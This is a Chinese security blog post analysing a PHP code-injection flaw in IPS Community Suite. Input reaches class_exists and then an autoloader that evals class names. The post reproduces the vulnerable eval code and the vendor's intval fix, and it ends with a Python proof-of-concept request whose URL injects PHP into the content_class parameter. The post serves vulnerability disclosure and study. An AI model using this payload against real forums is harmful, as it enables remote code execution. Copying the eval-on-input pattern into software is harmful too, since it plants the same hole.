<p>虽然最终我成功安装好了, 但是过程是艰辛的, 从ZoomEye上搜<code>IPS Community Suite</code>, 只搜出30+的结果, 然后再加上php的版本限制, 如果php版本在这范围内, 有耐心解决bug安装成功的, 然后还不懂安全, 能有多少？所以我觉得这是一个比较鸡肋的漏洞</p>
<hr>
<p>现在开始分析该漏洞</p>
<p>该漏洞关键点是利用了class_exists函数的机制，来举例说明一下，对比的环境是<code>php5.5.0 &amp;&amp; php7.0.0</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">Bar</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"a"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoLoadClass</span><span class="params">(<span class="variable">$name</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'spl_autoload_register: '</span>, <span class="variable">$name</span>, <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoLoadClass2</span><span class="params">(<span class="variable">$name</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'spl_autoload_register2: '</span>, <span class="variable">$name</span>, <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spl_autoload_register(<span class="string">'autoLoadClass'</span>);</span><br><span class="line">spl_autoload_register(<span class="string">'autoLoadClass2'</span>);</span><br><span class="line"></span><br><span class="line">class_exists(<span class="string">"Foo"</span>);</span><br><span class="line">class_exists(<span class="string">"Bar"</span>);</span><br><span class="line">class_exists(<span class="string">"Foo\Bar"</span>);</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面的代码说明的是<code>class_exists</code>函数的机制，两个版本的运行结果都一样</p>
<p><img src="http://qn.lazysheep.cc/img/ips_pic1.png" alt="ips_pic1"></p>
<p><code>class_exists</code>函数的作用是判断类是否存在，如果不存在，会去执行通过<code>spl_autoload_register</code>函数注册的函数，如果存在则返回true</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">Bar</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"a"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoLoadClass</span><span class="params">(<span class="variable">$name</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'spl_autoload_register: '</span>, <span class="variable">$name</span>, <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spl_autoload_register(<span class="string">'autoLoadClass'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span> ; <span class="variable">$i</span>++) &#123;</span><br><span class="line">	<span class="variable">$class_base</span> = <span class="string">"Foo"</span>;</span><br><span class="line">	<span class="variable">$class</span> = <span class="variable">$class_base</span>.chr(<span class="variable">$i</span>);</span><br><span class="line">	var_dump(class_exists(<span class="variable">$class</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"       =====&gt;   "</span>.chr(<span class="variable">$i</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面的代码是为了说明<code>php5.5.0</code> 与 <code>php7.0.0</code>在class_exists函数上的不同点</p>
<p>结果太长了不好截图, 自己跑跑就知道了, <code>php7.0.0</code>对于class_exists函数输入的classname有进行一系列的过滤, 如果classname中出现了非法字符则直接返回false, 而<code>php5.5.0</code>却不会进行任何字符检测，只是要未定义的类名皆会运行<code>spl_autoload_register</code>注册的函数</p>
<p>再来看看IPS的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_content</span> <span class="keyword">extends</span> \<span class="title">IPS</span>\<span class="title">Dispatcher</span>\<span class="title">Controller</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">/**</span><br><span class="line">	 * Find content</span><br><span class="line">	 *</span><br><span class="line">	 * <span class="doctag">@return</span>	void</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span><span class="params">()</span></span><br><span class="line">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> ( ! \IPS\Request::i()-&gt;content_class <span class="keyword">AND</span> ! \IPS\Request::i()-&gt;content_id <span class="keyword">AND</span> ! \IPS\Request::i()-&gt;content_commentid )</span><br><span class="line">		&#123;</span><br><span class="line">			\IPS\Output::i()-&gt;error( <span class="string">'node_error'</span>, <span class="string">'2S226/1'</span>, <span class="number">404</span>, <span class="string">''</span> );</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$class</span> = <span class="string">'IPS\\'</span> . implode( <span class="string">'\\'</span>, explode( <span class="string">'_'</span>, \IPS\Request::i()-&gt;content_class ) );</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( ! class_exists( <span class="variable">$class</span> ) <span class="keyword">or</span> ! in_array( <span class="string">'IPS\Content'</span>, class_parents( <span class="variable">$class</span> ) ) )</span><br><span class="line">		&#123;</span><br><span class="line">			\IPS\Output::i()-&gt;error( <span class="string">'node_error'</span>, <span class="string">'2S226/2'</span>, <span class="number">404</span>, <span class="string">''</span> );</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里的<code>class_exists</code>函数判断<code>$class</code>是否存在, 而<code>$class = &quot;IPS\&quot; + &quot;可控&quot;</code>, 所以如果我们构造一个不存在的类则会进入<code>spl_autoload_register</code>注册的函数之中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">spl_autoload_register( <span class="function"><span class="keyword">function</span><span class="params">( <span class="variable">$class</span> )</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">15</span> ) === <span class="string">'IPS\cms\Records'</span> <span class="keyword">and</span> is_numeric( mb_substr( <span class="variable">$class</span>, <span class="number">15</span>, <span class="number">1</span> ) ) )</span><br><span class="line">	&#123;</span><br><span class="line">		......</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">23</span> ) === <span class="string">'IPS\cms\Records\Comment'</span> <span class="keyword">and</span> is_numeric( mb_substr( <span class="variable">$class</span>, <span class="number">23</span>, <span class="number">1</span> ) ) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">23</span> );</span><br><span class="line">	</span><br><span class="line">		<span class="variable">$data</span> = <span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">		namespace IPS\cms\Records;</span><br><span class="line">		class Comment&#123;$databaseId&#125; extends Comment</span><br><span class="line">		&#123; </span><br><span class="line">			protected static \$multitons = array();</span><br><span class="line">			public static \$customDatabaseId = $databaseId;</span><br><span class="line">			public static \$itemClass = 'IPS\cms\Records&#123;$databaseId&#125;';</span><br><span class="line">			public static \$title     = 'content_record_comments_title_&#123;$databaseId&#125;';</span><br><span class="line">			public static \$reputationType = 'comment_id_&#123;$databaseId&#125;';</span><br><span class="line">		&#125;</span><br><span class="line">EOF;</span></span><br><span class="line">		<span class="keyword">eval</span>( <span class="variable">$data</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">22</span> ) === <span class="string">'IPS\cms\Records\Review'</span> <span class="keyword">and</span> is_numeric( mb_substr( <span class="variable">$class</span>, <span class="number">22</span>, <span class="number">1</span> ) ) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">22</span> );</span><br><span class="line"></span><br><span class="line">		<span class="variable">$data</span> = <span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">		namespace IPS\cms\Records;</span><br><span class="line">		class Review&#123;$databaseId&#125; extends Review</span><br><span class="line">		&#123;</span><br><span class="line">			protected static \$multitons = array();</span><br><span class="line">			public static \$customDatabaseId = $databaseId;</span><br><span class="line">			public static \$itemClass = 'IPS\cms\Records&#123;$databaseId&#125;';</span><br><span class="line">			public static \$title     = 'content_record_reviews_title_&#123;$databaseId&#125;';</span><br><span class="line">		&#125;</span><br><span class="line">EOF;</span></span><br><span class="line">		<span class="keyword">eval</span>( <span class="variable">$data</span> );</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">18</span> ) === <span class="string">'IPS\cms\Categories'</span> <span class="keyword">and</span> is_numeric( mb_substr( <span class="variable">$class</span>, <span class="number">18</span>, <span class="number">1</span> ) ) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">18</span> );</span><br><span class="line">	</span><br><span class="line">		<span class="variable">$data</span> = <span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">		namespace IPS\cms;</span><br><span class="line">		class Categories&#123;$databaseId&#125; extends Categories</span><br><span class="line">		&#123; </span><br><span class="line">			protected static \$multitons = array();</span><br><span class="line">			public static \$customDatabaseId = $databaseId;</span><br><span class="line">			public static \$contentItemClass = 'IPS\cms\Records&#123;$databaseId&#125;';</span><br><span class="line">			protected static \$containerIds = NULL;</span><br><span class="line">		&#125;</span><br><span class="line">EOF;</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">eval</span>( <span class="variable">$data</span> );</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">32</span> ) === <span class="string">'IPS\cms\Records\RecordsTopicSync'</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">32</span> );</span><br><span class="line">	</span><br><span class="line">		<span class="variable">$data</span> = <span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">		namespace IPS\cms\Records;</span><br><span class="line">		class RecordsTopicSync&#123;$databaseId&#125; extends \IPS\cms\Records&#123;$databaseId&#125;</span><br><span class="line">		&#123; </span><br><span class="line">			protected static \$multitons = array();</span><br><span class="line">			public static \$customDatabaseId = $databaseId;</span><br><span class="line">			public static \$databaseTable = 'cms_custom_database_&#123;$databaseId&#125;';</span><br><span class="line">			public static \$databaseColumnId = 'record_topicid';</span><br><span class="line">			public static \$commentClass = 'IPS\cms\Records\CommentTopicSync&#123;$databaseId&#125;';</span><br><span class="line"></span><br><span class="line">			public function useForumComments()</span><br><span class="line">			&#123;</span><br><span class="line">				return false;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">EOF;</span></span><br><span class="line">		<span class="keyword">eval</span>( <span class="variable">$data</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">32</span> ) === <span class="string">'IPS\cms\Records\CommentTopicSync'</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">32</span> );</span><br><span class="line"></span><br><span class="line">		<span class="variable">$data</span> = <span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">		namespace IPS\cms\Records;</span><br><span class="line">		class CommentTopicSync&#123;$databaseId&#125; extends CommentTopicSync</span><br><span class="line">		&#123; </span><br><span class="line">			protected static \$multitons = array();</span><br><span class="line">			public static \$customDatabaseId = $databaseId;</span><br><span class="line">			public static \$itemClass = 'IPS\cms\Records\RecordsTopicSync&#123;$databaseId&#125;';</span><br><span class="line">			public static \$title     = 'content_record_comments_title_&#123;$databaseId&#125;';</span><br><span class="line">		&#125;</span><br><span class="line">EOF;</span></span><br><span class="line">		<span class="keyword">eval</span>( <span class="variable">$data</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">14</span> ) === <span class="string">'IPS\cms\Fields'</span> <span class="keyword">and</span> is_numeric( mb_substr( <span class="variable">$class</span>, <span class="number">14</span>, <span class="number">1</span> ) ) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">14</span> );</span><br><span class="line">		<span class="keyword">eval</span>( <span class="string">"namespace IPS\\cms; class Fields&#123;$databaseId&#125; extends Fields &#123; public static \$customDatabaseId = $databaseId; &#125;"</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">47</span> ) === <span class="string">'IPS\cms\extensions\core\EditorLocations\Records'</span> <span class="keyword">and</span> is_numeric( mb_substr( <span class="variable">$class</span>, <span class="number">47</span>, <span class="number">1</span> ) ) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">47</span> );</span><br><span class="line">		<span class="keyword">eval</span>( <span class="string">"namespace IPS\\cms\\extensions\\core\\EditorLocations; class Records&#123;$databaseId&#125; extends \\IPS\\cms\\extensions\\core\\EditorLocations\\Records &#123; public static \$customDatabaseId = $databaseId; &#125;"</span> );</span><br><span class="line">	&#125;</span><br><span class="line">&#125; );</span><br></pre></td></tr></table></figure>
<p>除了第一个判断，其他所有判断我们都可以进入造成命令执行漏洞(所以第一个判断的代码我省略了), 比如第二判断</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">23</span> ) === <span class="string">'IPS\cms\Records\Comment'</span> <span class="keyword">and</span> is_numeric( mb_substr( <span class="variable">$class</span>, <span class="number">23</span>, <span class="number">1</span> ) ) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">23</span> );</span><br><span class="line">	</span><br><span class="line">		<span class="variable">$data</span> = <span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">		namespace IPS\cms\Records;</span><br><span class="line">		class Comment&#123;$databaseId&#125; extends Comment</span><br><span class="line">		&#123; </span><br><span class="line">			protected static \$multitons = array();</span><br><span class="line">			public static \$customDatabaseId = $databaseId;</span><br><span class="line">			public static \$itemClass = 'IPS\cms\Records&#123;$databaseId&#125;';</span><br><span class="line">			public static \$title     = 'content_record_comments_title_&#123;$databaseId&#125;';</span><br><span class="line">			public static \$reputationType = 'comment_id_&#123;$databaseId&#125;';</span><br><span class="line">		&#125;</span><br><span class="line">EOF;</span></span><br><span class="line">		<span class="keyword">eval</span>( <span class="variable">$data</span> );</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>如果<code>$class = &quot;IPS\cms\Records\Comment1xxxxxxxx&quot;</code> 则可以进入判断</p>
<p><img src="http://qn.lazysheep.cc/img/ips_pic2.png" alt="ips_pic2"></p>
<p>在比如最后一个判断再输出下执行的值:</p>
<p><img src="http://qn.lazysheep.cc/img/ips_pic3.png" alt="ips_pic3"></p>
<h2 id="总结">总结</h2><p>php版本限制的原因是闭合代码的字符, 比如<code>{ } ;</code>这些都属于非法字符, 上面的第二个测试代码有Fuzzing出允许的字符, 如果使用允许的字符能构造出语法正确的命令则可以增加该漏洞的杀伤力, 不过新版本已经使用<code>intval</code>函数对于输入进行过滤了</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//example</span><br><span class="line">if ( mb_substr( <span class="formula">$class, 0, 47 ) === 'IPS<span class="command">\cms</span><span class="command">\extensions</span><span class="command">\core</span><span class="command">\EditorLocations</span><span class="command">\Records</span>' and is_numeric( mb_substr( $</span>class, 47, 1 ) ) )</span><br><span class="line">	<span class="special">&#123;</span></span><br><span class="line">		<span class="formula">$databaseId = intval(mb_substr( $</span>class, 47 ));</span><br><span class="line">		eval( "namespace IPS<span class="command">\\</span>cms<span class="command">\\</span>extensions<span class="command">\\</span>core<span class="command">\\</span>EditorLocations; class Records<span class="special">&#123;</span><span class="formula">$databaseId<span class="special">&#125;</span> extends <span class="command">\\</span>IPS<span class="command">\\</span>cms<span class="command">\\</span>extensions<span class="command">\\</span>core<span class="command">\\</span>EditorLocations<span class="command">\\</span>Records <span class="special">&#123;</span> public static <span class="command">\$</span>customDatabaseId = $</span>databaseId; <span class="special">&#125;</span>" );</span><br><span class="line">	<span class="special">&#125;</span></span><br></pre></td></tr></table></figure>
<p>带上PoC:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self)</span>:</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    random_string = random.choice(string.ascii_lowercase) + random.choice(string.ascii_uppercase)</span><br><span class="line">    random_string = hashlib.sha1(random_string).hexdigest()[<span class="number">20</span>:] + <span class="string">"H"</span></span><br><span class="line">    random_num1 = random.randint(<span class="number">24</span>,<span class="number">46330</span>)</span><br><span class="line">    random_num2 = random.randint(<span class="number">200</span>,<span class="number">46040</span>)</span><br><span class="line">    payload = <span class="string">'/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class=cms\Fields1&#123;&#125;echo %s*%s, "%s";exit;/*'</span> %(random_num1, random_num2, random_string)</span><br><span class="line">    res = req.get(self.url + payload)        </span><br><span class="line">    random_string = str(random_num1*random_num2) + random_string</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> random_string <span class="keyword">in</span> res.content:</span><br><span class="line">        result = &#123;<span class="string">'VerifyInfo'</span>: &#123;&#125;&#125;</span><br><span class="line">        result[<span class="string">'VerifyInfo'</span>][<span class="string">'URL'</span>] = self.url</span><br><span class="line">    <span class="keyword">return</span> self.parse_output(result)</span><br></pre></td></tr></table></figure></p>
]]></content:encoded>
      <comments>http://0x48.pw/2016/08/10/0x1F/#disqus_comments</comments>
    </item>
    
  </channel>
</rss>